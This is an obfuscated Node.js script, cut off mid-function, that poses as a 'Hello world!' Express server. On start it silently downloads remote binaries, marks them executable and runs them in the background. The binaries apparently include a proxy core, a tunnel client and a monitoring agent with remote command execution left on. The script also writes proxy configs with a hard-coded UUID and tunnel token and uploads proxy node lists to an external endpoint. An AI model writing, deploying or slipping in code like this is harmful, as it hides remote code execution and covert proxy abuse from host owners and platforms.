const _0x462b9f=_0x3995;(function(_0x55bd79,_0x512542){const _0x327eab={_0xa7f255:0x153,_0x20e358:0x196,_0x2d0de3:0x1b8,_0x3ded1c:0x12e,_0x57684e:0x1a9},_0x436802=_0x3995,_0x2b6c75=_0x55bd79();while(!![]){try{const _0x56cd32=-parseInt(_0x436802(_0x327eab._0xa7f255))/0x1*(-parseInt(_0x436802(0x1d6))/0x2)+parseInt(_0x436802(_0x327eab._0x20e358))/0x3*(parseInt(_0x436802(_0x327eab._0x2d0de3))/0x4)+parseInt(_0x436802(0x1a8))/0x5+-parseInt(_0x436802(0x14c))/0x6+parseInt(_0x436802(_0x327eab._0x3ded1c))/0x7+parseInt(_0x436802(_0x327eab._0x57684e))/0x8*(-parseInt(_0x436802(0x176))/0x9)+-parseInt(_0x436802(0x1a2))/0xa;if(_0x56cd32===_0x512542)break;else _0x2b6c75['push'](_0x2b6c75['shift']());}catch(_0x1d2149){_0x2b6c75['push'](_0x2b6c75['shift']());}}}(_0x5e85,0x732e1));const express=require(_0x462b9f(0x1cb)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x462b9f(0x1c0)),exec=promisify(require(_0x462b9f(0x1ab))[_0x462b9f(0x187)]),{execSync}=require(_0x462b9f(0x1ab)),UPLOAD_URL=process[_0x462b9f(0x136)][_0x462b9f(0x14b)]||'',PROJECT_URL=process[_0x462b9f(0x136)]['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x462b9f(0x136)]['FILE_PATH']||_0x462b9f(0x159),SUB_PATH=process['env'][_0x462b9f(0x190)]||'sub',PORT=process[_0x462b9f(0x136)][_0x462b9f(0x1a5)]||process['env'][_0x462b9f(0x137)]||0xbb8,UUID=process[_0x462b9f(0x136)][_0x462b9f(0x1cf)]||_0x462b9f(0x16e),NEZHA_SERVER=process[_0x462b9f(0x136)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x462b9f(0x136)][_0x462b9f(0x15f)]||'',NEZHA_KEY=process[_0x462b9f(0x136)][_0x462b9f(0x17e)]||'',ARGO_DOMAIN=process[_0x462b9f(0x136)][_0x462b9f(0x1d3)]||_0x462b9f(0x12c),ARGO_AUTH=process[_0x462b9f(0x136)][_0x462b9f(0x17f)]||'eyJhIjoiZTBhYzYwNjQwN2Y0OTQwODc4N2UzMzk1YmU2NDkyNDgiLCJ0IjoiZTIxZWY3NWQtNTJmZi00MTk0LTliNDctZWQxMmZmZDY1NjI2IiwicyI6Ik1HWTFaalpqWW1RdE16WmhNeTAwTlRSaExUZzNZV1V0WVROak1HSTBNbU0zWm1FeiJ9',ARGO_PORT=process[_0x462b9f(0x136)][_0x462b9f(0x1ca)]||0x1f41,CFIP=process[_0x462b9f(0x136)][_0x462b9f(0x148)]||_0x462b9f(0x133),CFPORT=process[_0x462b9f(0x136)]['CFPORT']||0x1bb,NAME=process[_0x462b9f(0x136)]['NAME']||_0x462b9f(0x183);!fs[_0x462b9f(0x1bb)](FILE_PATH)?(fs[_0x462b9f(0x19d)](FILE_PATH),console['log'](FILE_PATH+_0x462b9f(0x18e))):console[_0x462b9f(0x185)](FILE_PATH+_0x462b9f(0x164));function generateRandomName(){const _0x1b1f4c=_0x462b9f,_0x359c57='abcdefghijklmnopqrstuvwxyz';let _0x234e5b='';for(let _0x5112ba=0x0;_0x5112ba<0x6;_0x5112ba++){_0x234e5b+=_0x359c57['charAt'](Math[_0x1b1f4c(0x157)](Math['random']()*_0x359c57['length']));}return _0x234e5b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x3995(_0x1f381e,_0xe9d7c9){const _0x5e8555=_0x5e85();return _0x3995=function(_0x3995e5,_0x39cfe7){_0x3995e5=_0x3995e5-0x129;let _0x2560be=_0x5e8555[_0x3995e5];return _0x2560be;},_0x3995(_0x1f381e,_0xe9d7c9);}let npmPath=path[_0x462b9f(0x156)](FILE_PATH,npmName),phpPath=path[_0x462b9f(0x156)](FILE_PATH,phpName),webPath=path[_0x462b9f(0x156)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x462b9f(0x156)](FILE_PATH,'sub.txt'),listPath=path[_0x462b9f(0x156)](FILE_PATH,_0x462b9f(0x17c)),bootLogPath=path[_0x462b9f(0x156)](FILE_PATH,_0x462b9f(0x1d7)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x5bcdfd={_0x2ea1a9:0x1bb,_0x1359da:0x1e2,_0xb0877d:0x15e,_0x4e32d0:0x1d9,_0x3a30e5:0x138},_0x31d00e=_0x462b9f;try{if(!UPLOAD_URL)return;if(!fs[_0x31d00e(_0x5bcdfd._0x2ea1a9)](subPath))return;let _0x5ab40f;try{_0x5ab40f=fs[_0x31d00e(0x192)](subPath,_0x31d00e(0x1d2));}catch{return null;}const _0x1dc8ef=Buffer[_0x31d00e(0x14f)](_0x5ab40f,_0x31d00e(_0x5bcdfd._0x1359da))['toString'](_0x31d00e(0x1d2)),_0x442ff7=_0x1dc8ef[_0x31d00e(_0x5bcdfd._0xb0877d)]('\x0a')[_0x31d00e(0x18b)](_0x18e26a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x31d00e(0x1b4)](_0x18e26a));if(_0x442ff7['length']===0x0)return;return axios[_0x31d00e(0x1cc)](UPLOAD_URL+_0x31d00e(_0x5bcdfd._0x4e32d0),JSON[_0x31d00e(0x1e6)]({'nodes':_0x442ff7}),{'headers':{'Content-Type':'application/json'}})[_0x31d00e(_0x5bcdfd._0x3a30e5)](_0xeff8b=>{return null;}),null;}catch(_0x10c686){return null;}}function cleanupOldFiles(){const _0x56ae71={_0x2116a7:0x158},_0x446858={_0x417b3e:0x156,_0x177f1e:0x1b1},_0x3b6a7b=_0x462b9f;try{const _0x25f9b7=fs[_0x3b6a7b(0x16f)](FILE_PATH);_0x25f9b7[_0x3b6a7b(_0x56ae71._0x2116a7)](_0xa120cb=>{const _0x46a405=_0x3b6a7b,_0x424040=path[_0x46a405(_0x446858._0x417b3e)](FILE_PATH,_0xa120cb);try{const _0x565c9d=fs[_0x46a405(_0x446858._0x177f1e)](_0x424040);_0x565c9d[_0x46a405(0x135)]()&&fs['unlinkSync'](_0x424040);}catch(_0x51556c){}});}catch(_0x18715e){}}app['get']('/',function(_0x58673d,_0x209050){const _0x1dcd08=_0x462b9f;_0x209050[_0x1dcd08(0x174)](_0x1dcd08(0x1d1));});function _0x5e85(){const _0x506f9e=['\x20>/dev/null\x202>&1','NEZHA_KEY','ARGO_AUTH','pkill\x20-f\x20\x22[','win32','Unknown','lw-tl-1226','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','log','text/plain;\x20charset=utf-8','exec','web\x20running\x20error:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','basename','filter','block','https+local://8.8.8.8/dns-query','\x20is\x20created','listen','SUB_PATH','tcp','readFileSync','\x0a\x0atrojan://','https://amd64.ssss.nyc.mn/v1','charAt','1059RPBVJV','/tunnel.yml\x20run','443','Error\x20reading\x20boot.log:','application/json','http\x20server\x20is\x20running\x20on\x20port:','/api/add-subscriptions','mkdirSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Download\x20','Nodes\x20uploaded\x20successfully','unlink','1204370BTTpWP','/dev/null','unlinkSync','SERVER_PORT','vmess','https://arm64.ssss.nyc.mn/agent','3456725ZycsUf','8lpdYQy','fileUrl','child_process','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','match','has','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','del\x20/f\x20/q\x20','statSync','push','https://amd64.ssss.nyc.mn/agent','test','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/api/add-nodes','?security=tls&sni=','6756CLYLQX','?encryption=none&security=tls&sni=','aarch64','existsSync','status','country_code','npm\x20running\x20error:\x20','substring','util','/vless-argo','map','\x0a\x20\x20credentials-file:\x20','2083','org','http','writeFileSync','message','none','ARGO_PORT','express','post','\x20>/dev/null\x202>&1\x20&','\x20successfully','UUID','amd','Hello\x20world!','utf-8','ARGO_DOMAIN','arm','config.yaml','22942fngbyF','boot.log','nohup\x20','/api/delete-nodes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','response','blackhole','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','&path=%2Ftrojan-argo%3Fed%3D2560#','https://amd64.ssss.nyc.mn/web','Error\x20executing\x20command:\x20','get','base64','pipe','2087','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','stringify','countryCode','pop','success','railwa.myww.dpdns.org','quic','1627045UzyjdY','&path=%2Fvless-argo%3Fed%3D2560#','Content-Type','freedom','\x20is\x20running','cdns.doon.eu.org','arm64','isFile','env','PORT','catch','\x20-c\x20','then','&fp=firefox&type=ws&host=','firefox','2053','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','unshift','config.json','/vmess-argo','https://arm64.ssss.nyc.mn/web','error','platform','length','Error\x20in\x20startserver:','ARGO_DOMAIN:','CFIP','https://oooo.serv00.net/add-url','\x20-p\x20','UPLOAD_URL','2374866Sjfofo','\x20-c\x20\x22','xtls-rprx-vision','from','vless','trojan','2096','5CHBecu','data','127.0.0.1','join','floor','forEach','./tmp','tunnel.json','set','\x20>\x20nul\x202>&1','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','split','NEZHA_PORT','fileName','Error\x20downloading\x20files:','close','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20already\x20exists','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20-s\x20','all','https://arm64.ssss.nyc.mn/bot','toString','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','ArgoDomain:','8443','true','9afd1229-b893-40c1-84dd-51e7ce204913','readdirSync','arch','/trojan-argo','tls','\x0a\x0avmess://','send','finish','5303943wdNgTh','includes','clear','automatic\x20access\x20task\x20added\x20successfully','https://arm64.ssss.nyc.mn/v1','chmod','list.txt'];_0x5e85=function(){return _0x506f9e;};return _0x5e85();}async function generateConfig(){const _0x5f6ecd={_0xd02a4:0x150,_0xbfcd2:0x14e,_0x403a5c:0x155,_0x1c548e:0x1c9,_0x49db41:0x172,_0x5a64c4:0x1a6,_0x5643a4:0x141,_0xdbcfe3:0x1c6,_0x41389b:0x151,_0x3f2415:0x1c9,_0x28d740:0x171,_0x3e99c9:0x172,_0x451a0f:0x18d,_0x540245:0x1dc,_0x339d0c:0x1c7,_0x5f2242:0x1e6},_0x2776ee=_0x462b9f,_0x50d565={'log':{'access':_0x2776ee(0x1a3),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2776ee(_0x5f6ecd._0xd02a4),'settings':{'clients':[{'id':UUID,'flow':_0x2776ee(_0x5f6ecd._0xbfcd2)}],'decryption':_0x2776ee(0x1c9),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2776ee(0x141),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2776ee(0x191)}},{'port':0xbb9,'listen':_0x2776ee(_0x5f6ecd._0x403a5c),'protocol':_0x2776ee(0x150),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x2776ee(0x191),'security':_0x2776ee(_0x5f6ecd._0x1c548e)}},{'port':0xbba,'listen':_0x2776ee(0x155),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2776ee(0x1c9),'wsSettings':{'path':_0x2776ee(0x1c1)}},'sniffing':{'enabled':!![],'destOverride':[_0x2776ee(0x1c6),_0x2776ee(_0x5f6ecd._0x49db41),_0x2776ee(0x12d)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2776ee(0x155),'protocol':_0x2776ee(_0x5f6ecd._0x5a64c4),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2776ee(_0x5f6ecd._0x5643a4)}},'sniffing':{'enabled':!![],'destOverride':[_0x2776ee(_0x5f6ecd._0xdbcfe3),_0x2776ee(_0x5f6ecd._0x49db41),_0x2776ee(0x12d)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2776ee(0x155),'protocol':_0x2776ee(_0x5f6ecd._0x41389b),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2776ee(_0x5f6ecd._0x3f2415),'wsSettings':{'path':_0x2776ee(_0x5f6ecd._0x28d740)}},'sniffing':{'enabled':!![],'destOverride':[_0x2776ee(0x1c6),_0x2776ee(_0x5f6ecd._0x3e99c9),_0x2776ee(0x12d)],'metadataOnly':![]}}],'dns':{'servers':[_0x2776ee(_0x5f6ecd._0x451a0f)]},'outbounds':[{'protocol':_0x2776ee(0x131),'tag':'direct'},{'protocol':_0x2776ee(_0x5f6ecd._0x540245),'tag':_0x2776ee(0x18c)}]};fs[_0x2776ee(_0x5f6ecd._0x339d0c)](path['join'](FILE_PATH,_0x2776ee(0x140)),JSON[_0x2776ee(_0x5f6ecd._0x5f2242)](_0x50d565,null,0x2));}function getSystemArchitecture(){const _0x358a47=_0x462b9f,_0x5ba81b=os[_0x358a47(0x170)]();return _0x5ba81b===_0x358a47(0x1d4)||_0x5ba81b===_0x358a47(0x134)||_0x5ba81b===_0x358a47(0x1ba)?_0x358a47(0x1d4):_0x358a47(0x1d0);}function downloadFile(_0x41685a,_0x5e7810,_0x581846){const _0x318e3b={_0x542624:0x1e1,_0x4d6f13:0x13a},_0x445ff4={_0x1cc12f:0x143},_0x96a978={_0x182a88:0x1e3},_0x253d2b={_0x5c21ff:0x162,_0x1930d4:0x185,_0x466197:0x19f,_0x163d0f:0x18a,_0x26c7d1:0x1ce},_0x33c275=_0x462b9f,_0x133e7c=_0x41685a;!fs[_0x33c275(0x1bb)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x934bc9=fs['createWriteStream'](_0x133e7c);axios({'method':_0x33c275(_0x318e3b._0x542624),'url':_0x5e7810,'responseType':'stream'})[_0x33c275(_0x318e3b._0x4d6f13)](_0x182bdb=>{const _0x298e01={_0x2a9cf1:0x18a,_0x1bbc81:0x1c8,_0x199700:0x143},_0x1f507d=_0x33c275;_0x182bdb['data'][_0x1f507d(_0x96a978._0x182a88)](_0x934bc9),_0x934bc9['on'](_0x1f507d(0x175),()=>{const _0x8f5268=_0x1f507d;_0x934bc9[_0x8f5268(_0x253d2b._0x5c21ff)](),console[_0x8f5268(_0x253d2b._0x1930d4)](_0x8f5268(_0x253d2b._0x466197)+path[_0x8f5268(_0x253d2b._0x163d0f)](_0x133e7c)+_0x8f5268(_0x253d2b._0x26c7d1)),_0x581846(null,_0x133e7c);}),_0x934bc9['on'](_0x1f507d(0x143),_0x6d0001=>{const _0x26262b=_0x1f507d;fs[_0x26262b(0x1a1)](_0x133e7c,()=>{});const _0x2d91c3=_0x26262b(0x19f)+path[_0x26262b(_0x298e01._0x2a9cf1)](_0x133e7c)+'\x20failed:\x20'+_0x6d0001[_0x26262b(_0x298e01._0x1bbc81)];console[_0x26262b(_0x298e01._0x199700)](_0x2d91c3),_0x581846(_0x2d91c3);});})[_0x33c275(0x138)](_0x3362ec=>{const _0x3ec1c6=_0x33c275,_0x191b4a=_0x3ec1c6(0x19f)+path['basename'](_0x133e7c)+'\x20failed:\x20'+_0x3362ec['message'];console[_0x3ec1c6(_0x445ff4._0x1cc12f)](_0x191b4a),_0x581846(_0x191b4a);});}async function downloadFilesAndRun(){const _0x17243b={_0x367514:0x145,_0x21f185:0x1e5,_0x245f90:0x1c2,_0x4ba009:0x143,_0x2466ea:0x12a,_0x498f49:0x16c,_0x1aa17f:0x1e4,_0x2c174c:0x1c4,_0x82e6fa:0x19e,_0x39e558:0x1d5,_0x55167c:0x1d8,_0x30ab67:0x14d,_0x1d645e:0x198,_0x17f3ba:0x152,_0x3fc78f:0x177,_0x3e969e:0x166,_0x582a1e:0x14a,_0x38047b:0x185,_0x2d912b:0x1be,_0x59f0eb:0x139,_0x29f2fc:0x1cd},_0x1f7ecc={_0x14139d:0x1bb},_0x2c46c0=_0x462b9f,_0x13ea42=getSystemArchitecture(),_0x28c902=getFilesForArchitecture(_0x13ea42);if(_0x28c902[_0x2c46c0(_0x17243b._0x367514)]===0x0){console[_0x2c46c0(0x185)](_0x2c46c0(_0x17243b._0x21f185));return;}const _0x104fd0=_0x28c902[_0x2c46c0(_0x17243b._0x245f90)](_0x4dec69=>{const _0x4e6446={_0x5b073d:0x1aa};return new Promise((_0x873137,_0x24cca8)=>{const _0x420813=_0x3995;downloadFile(_0x4dec69[_0x420813(0x160)],_0x4dec69[_0x420813(_0x4e6446._0x5b073d)],(_0xea150,_0x990ccd)=>{_0xea150?_0x24cca8(_0xea150):_0x873137(_0x990ccd);});});});try{await Promise[_0x2c46c0(0x167)](_0x104fd0);}catch(_0x536812){console[_0x2c46c0(_0x17243b._0x4ba009)](_0x2c46c0(0x161),_0x536812);return;}function _0x489f22(_0x578a52){const _0x57dc83=_0x2c46c0,_0x4e2799=0x1fd;_0x578a52[_0x57dc83(0x158)](_0x41c5fa=>{const _0x58006a={_0x43c1a2:0x185,_0x306db2:0x169},_0x12b3f2=_0x57dc83;fs[_0x12b3f2(_0x1f7ecc._0x14139d)](_0x41c5fa)&&fs[_0x12b3f2(0x17b)](_0x41c5fa,_0x4e2799,_0xb69e19=>{const _0xa2e83a=_0x12b3f2;_0xb69e19?console[_0xa2e83a(0x143)]('Empowerment\x20failed\x20for\x20'+_0x41c5fa+':\x20'+_0xb69e19):console[_0xa2e83a(_0x58006a._0x43c1a2)]('Empowerment\x20success\x20for\x20'+_0x41c5fa+':\x20'+_0x4e2799[_0xa2e83a(_0x58006a._0x306db2)](0x8));});});}const _0xfe88a9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x489f22(_0xfe88a9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2cfcbc=NEZHA_SERVER[_0x2c46c0(0x177)](':')?NEZHA_SERVER[_0x2c46c0(0x15e)](':')[_0x2c46c0(_0x17243b._0x2466ea)]():'',_0x1714b2=new Set([_0x2c46c0(0x198),_0x2c46c0(_0x17243b._0x498f49),_0x2c46c0(0x152),_0x2c46c0(_0x17243b._0x1aa17f),_0x2c46c0(_0x17243b._0x2c174c),_0x2c46c0(0x13d)]),_0xb981e8=_0x1714b2[_0x2c46c0(0x1ae)](_0x2cfcbc)?_0x2c46c0(0x16d):'false',_0xda65af='\x0aclient_secret:\x20'+NEZHA_KEY+_0x2c46c0(0x184)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xb981e8+_0x2c46c0(_0x17243b._0x82e6fa)+UUID;fs[_0x2c46c0(0x1c7)](path['join'](FILE_PATH,_0x2c46c0(_0x17243b._0x39e558)),_0xda65af);const _0x40d9d4=_0x2c46c0(_0x17243b._0x55167c)+phpPath+_0x2c46c0(_0x17243b._0x30ab67)+FILE_PATH+_0x2c46c0(0x15d);try{await exec(_0x40d9d4),console['log'](phpName+_0x2c46c0(0x132)),await new Promise(_0x586f74=>setTimeout(_0x586f74,0x3e8));}catch(_0x11b8ac){console[_0x2c46c0(_0x17243b._0x4ba009)]('php\x20running\x20error:\x20'+_0x11b8ac);}}else{let _0x4d5e27='';const _0x32715a=[_0x2c46c0(_0x17243b._0x1d645e),_0x2c46c0(0x16c),_0x2c46c0(_0x17243b._0x17f3ba),'2087',_0x2c46c0(_0x17243b._0x2c174c),'2053'];_0x32715a[_0x2c46c0(_0x17243b._0x3fc78f)](NEZHA_PORT)&&(_0x4d5e27='--tls');const _0x3c657a='nohup\x20'+npmPath+_0x2c46c0(_0x17243b._0x3e969e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2c46c0(_0x17243b._0x582a1e)+NEZHA_KEY+'\x20'+_0x4d5e27+_0x2c46c0(0x163);try{await exec(_0x3c657a),console[_0x2c46c0(_0x17243b._0x38047b)](npmName+'\x20is\x20running'),await new Promise(_0x48b5e8=>setTimeout(_0x48b5e8,0x3e8));}catch(_0x26c58a){console['error'](_0x2c46c0(_0x17243b._0x2d912b)+_0x26c58a);}}}else console['log'](_0x2c46c0(0x165));const _0x476267=_0x2c46c0(0x1d8)+webPath+_0x2c46c0(_0x17243b._0x59f0eb)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x476267),console[_0x2c46c0(_0x17243b._0x38047b)](webName+'\x20is\x20running'),await new Promise(_0x8abea9=>setTimeout(_0x8abea9,0x3e8));}catch(_0x3c0b60){console[_0x2c46c0(0x143)](_0x2c46c0(0x188)+_0x3c0b60);}if(fs['existsSync'](botPath)){let _0x15f4da;if(ARGO_AUTH[_0x2c46c0(0x1ad)](/^[A-Z0-9a-z=]{120,250}$/))_0x15f4da=_0x2c46c0(0x1da)+ARGO_AUTH;else ARGO_AUTH[_0x2c46c0(0x1ad)](/TunnelSecret/)?_0x15f4da='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x2c46c0(0x197):_0x15f4da='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2c46c0(0x189)+ARGO_PORT;try{await exec(_0x2c46c0(0x1d8)+botPath+'\x20'+_0x15f4da+_0x2c46c0(_0x17243b._0x29f2fc)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x9563b9=>setTimeout(_0x9563b9,0x7d0));}catch(_0x36b72f){console[_0x2c46c0(0x143)](_0x2c46c0(0x1e0)+_0x36b72f);}}await new Promise(_0x2ed2ea=>setTimeout(_0x2ed2ea,0x1388));}function getFilesForArchitecture(_0x35d4e7){const _0x1a1c6d={_0x159cec:0x142,_0x1996cc:0x1a7,_0x40029c:0x17a},_0x1d192b=_0x462b9f;let _0x3cda2e;_0x35d4e7===_0x1d192b(0x1d4)?_0x3cda2e=[{'fileName':webPath,'fileUrl':_0x1d192b(_0x1a1c6d._0x159cec)},{'fileName':botPath,'fileUrl':_0x1d192b(0x168)}]:_0x3cda2e=[{'fileName':webPath,'fileUrl':_0x1d192b(0x1df)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1e268e=_0x35d4e7==='arm'?_0x1d192b(_0x1a1c6d._0x1996cc):_0x1d192b(0x1b3);_0x3cda2e[_0x1d192b(0x13f)]({'fileName':npmPath,'fileUrl':_0x1e268e});}else{const _0x541d4c=_0x35d4e7===_0x1d192b(0x1d4)?_0x1d192b(_0x1a1c6d._0x40029c):_0x1d192b(0x194);_0x3cda2e['unshift']({'fileName':phpPath,'fileUrl':_0x541d4c});}}return _0x3cda2e;}function argoType(){const _0x4cdc6b={_0x15345f:0x1c7,_0x2a77b9:0x156,_0x38f36a:0x15a,_0x3a0a97:0x15e,_0x7da2fb:0x1ac,_0x1c37f1:0x1af},_0xebb2ae=_0x462b9f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xebb2ae(0x185)](_0xebb2ae(0x13e));return;}if(ARGO_AUTH[_0xebb2ae(0x177)]('TunnelSecret')){fs[_0xebb2ae(_0x4cdc6b._0x15345f)](path[_0xebb2ae(_0x4cdc6b._0x2a77b9)](FILE_PATH,_0xebb2ae(_0x4cdc6b._0x38f36a)),ARGO_AUTH);const _0xc328='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0xebb2ae(_0x4cdc6b._0x3a0a97)]('\x22')[0xb]+_0xebb2ae(0x1c3)+path['join'](FILE_PATH,_0xebb2ae(0x15a))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0xebb2ae(_0x4cdc6b._0x7da2fb)+ARGO_PORT+_0xebb2ae(0x16a);fs[_0xebb2ae(0x1c7)](path[_0xebb2ae(_0x4cdc6b._0x2a77b9)](FILE_PATH,'tunnel.yml'),_0xc328);}else console['log'](_0xebb2ae(_0x4cdc6b._0x1c37f1));}async function extractDomains(){const _0x3ca246={_0x95006a:0x185,_0x5248b1:0x147,_0x3d4a5f:0x192,_0x3763ff:0x1d7,_0x7e9f4e:0x1d2,_0x10e99d:0x15e,_0xd90b88:0x158,_0x23debb:0x16b,_0x48610e:0x189,_0x4025ae:0x1d8,_0x524063:0x1cd,_0x495c99:0x1e0,_0x2993d6:0x143,_0x267287:0x199},_0x1f0f2d={_0x19d1b9:0x154,_0x584fc1:0x1bd,_0x5138d8:0x1bd,_0x472122:0x154,_0x27acb0:0x129,_0x161496:0x154},_0x454141={_0x2b9f8c:0x1bf},_0xcebaaf={_0x2b611d:0x1ad},_0x5cd417=_0x462b9f;let _0x472be7;if(ARGO_AUTH&&ARGO_DOMAIN)_0x472be7=ARGO_DOMAIN,console[_0x5cd417(_0x3ca246._0x95006a)](_0x5cd417(_0x3ca246._0x5248b1),_0x472be7),await _0x738f95(_0x472be7);else try{const _0x23f1db=fs[_0x5cd417(_0x3ca246._0x3d4a5f)](path['join'](FILE_PATH,_0x5cd417(_0x3ca246._0x3763ff)),_0x5cd417(_0x3ca246._0x7e9f4e)),_0x347174=_0x23f1db[_0x5cd417(_0x3ca246._0x10e99d)]('\x0a'),_0x519d70=[];_0x347174[_0x5cd417(_0x3ca246._0xd90b88)](_0x470070=>{const _0x4a228a=_0x5cd417,_0xdc8a26=_0x470070[_0x4a228a(_0xcebaaf._0x2b611d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xdc8a26){const _0x384f83=_0xdc8a26[0x1];_0x519d70['push'](_0x384f83);}});if(_0x519d70['length']>0x0)_0x472be7=_0x519d70[0x0],console['log'](_0x5cd417(_0x3ca246._0x23debb),_0x472be7),await _0x738f95(_0x472be7);else{console[_0x5cd417(0x185)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x5cd417(0x1a4)](path[_0x5cd417(0x156)](FILE_PATH,'boot.log'));async function _0x37d320(){const _0x46854f=_0x5cd417;try{process['platform']===_0x46854f(0x181)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x46854f(0x180)+botName[_0x46854f(0x195)](0x0)+']'+botName[_0x46854f(_0x454141._0x2b9f8c)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2183ba){}}_0x37d320(),await new Promise(_0x3d9c93=>setTimeout(_0x3d9c93,0xbb8));const _0x4af8b4=_0x5cd417(0x1b5)+FILE_PATH+_0x5cd417(_0x3ca246._0x48610e)+ARGO_PORT;try{await exec(_0x5cd417(_0x3ca246._0x4025ae)+botPath+'\x20'+_0x4af8b4+_0x5cd417(_0x3ca246._0x524063)),console[_0x5cd417(0x185)](botName+_0x5cd417(0x132)),await new Promise(_0x217a6e=>setTimeout(_0x217a6e,0xbb8)),await extractDomains();}catch(_0xd670bb){console[_0x5cd417(0x143)](_0x5cd417(_0x3ca246._0x495c99)+_0xd670bb);}}}catch(_0x14bdc4){console[_0x5cd417(_0x3ca246._0x2993d6)](_0x5cd417(_0x3ca246._0x267287),_0x14bdc4);}async function _0x400dfc(){const _0x27585f=_0x5cd417;try{const _0x353da9=await axios[_0x27585f(0x1e1)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x353da9[_0x27585f(0x154)]&&_0x353da9[_0x27585f(_0x1f0f2d._0x19d1b9)][_0x27585f(_0x1f0f2d._0x584fc1)]&&_0x353da9[_0x27585f(0x154)][_0x27585f(0x1c5)])return _0x353da9['data'][_0x27585f(_0x1f0f2d._0x5138d8)]+'_'+_0x353da9[_0x27585f(_0x1f0f2d._0x472122)][_0x27585f(0x1c5)];}catch(_0x2e67f9){try{const _0x59bb21=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x59bb21[_0x27585f(0x154)]&&_0x59bb21['data']['status']===_0x27585f(0x12b)&&_0x59bb21['data'][_0x27585f(_0x1f0f2d._0x27acb0)]&&_0x59bb21[_0x27585f(_0x1f0f2d._0x161496)]['org'])return _0x59bb21[_0x27585f(0x154)][_0x27585f(_0x1f0f2d._0x27acb0)]+'_'+_0x59bb21[_0x27585f(_0x1f0f2d._0x161496)][_0x27585f(0x1c5)];}catch(_0x1aaddd){}}return _0x27585f(0x182);}async function _0x738f95(_0x134e95){const _0x37ceb8=await _0x400dfc(),_0x1deb34=NAME?NAME+'-'+_0x37ceb8:_0x37ceb8;return new Promise(_0xd9fd65=>{const 